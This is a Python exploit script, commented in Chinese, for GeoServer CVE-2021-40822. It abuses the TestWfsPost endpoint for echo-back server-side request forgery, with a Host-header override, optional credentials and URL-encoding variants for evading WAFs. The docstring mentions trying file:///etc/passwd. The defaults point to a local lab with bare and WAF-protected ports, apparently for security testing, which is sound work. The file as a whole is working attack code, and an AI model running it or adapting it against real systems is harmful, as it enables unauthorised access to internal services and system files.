# -*- coding: utf-8 -*-
"""GeoServer CVE-2021-40822（TestWfsPost SSRF）exp。

官方 seed：POST /geoserver/TestWfsPost，参数 url（目标）、body（非空则转 POST）、
username/password（Basic 认证）。约束：url 的 host 必须与请求 Host 头一致。
回显型 SSRF：目标响应体直接出现在本请求响应中（真值即回显内容）。

预留变异旋钮（WAF/RASP 轮用）：
  --fetch-url  目标 URL（http://infra:8000/... 、file:///etc/passwd 等非 http scheme
               的可达性留待实测——URLConnection 层差异）
  --body       非空则服务端发 POST
  --auth       user:password（可选）
  --host-header  覆写请求 Host 头（必须等于 fetch-url 的 host[:port]）
  --uri        入口路径（默认 /geoserver/TestWfsPost）
"""
import argparse
import os
import sys
from urllib.parse import urlsplit

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common import session  # noqa: E402


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18082, help="18082=裸 / 18382=WAF")
    ap.add_argument("--uri", default="/geoserver/TestWfsPost")
    ap.add_argument("--fetch-url", default="http://infra:8000/hello.txt")
    ap.add_argument("--body", default="")
    ap.add_argument("--auth", default=None, help="user:password")
    ap.add_argument("--host-header", default=None)
    ap.add_argument("--encode", choices=["none", "space-in-path", "double-encoded"],
                    default="none", help="URL 归一化差异测试")
    a = ap.parse_args()

    fetch = a.fetch_url
    if a.encode == "space-in-path":
        parts = urlsplit(fetch)
        fetch = "%s://%s%s" % (parts.scheme, parts.netloc,
                               parts.path.replace("/", "/%20", 1))
    elif a.encode == "double-encoded":
        parts = urlsplit(fetch)
        path = parts.path.replace("%", "%2525")
        fetch = "%s://%s%s" % (parts.scheme, parts.netloc, path)

    host_header = a.host_header or urlsplit(fetch).netloc
    url = "http://%s:%d%s" % (a.host, a.port, a.uri)

    data = {"url": fetch}
    if a.body:
        data["body"] = a.body
    if a.auth:
        u, _, p = a.auth.partition(":")
        data["username"] = u
        data["password"] = p

    print("[*] SSRF 目标=%s Host头=%s body=%s" % (fetch, host_header, bool(a.body)))
    s = session()
    r = s.post(url, data=data, headers={"Host": host_header}, timeout=60)
    print("[*] POST %s -> HTTP %s (%d bytes)" % (url, r.status_code, len(r.content)))
    text = r.text
    if len(text) > 2000:
        text = text[:1000] + "\n...[截断]...\n" + text[-1000:]
    print("[*] 响应体：\n%s" % text)


if __name__ == "__main__":
    main()
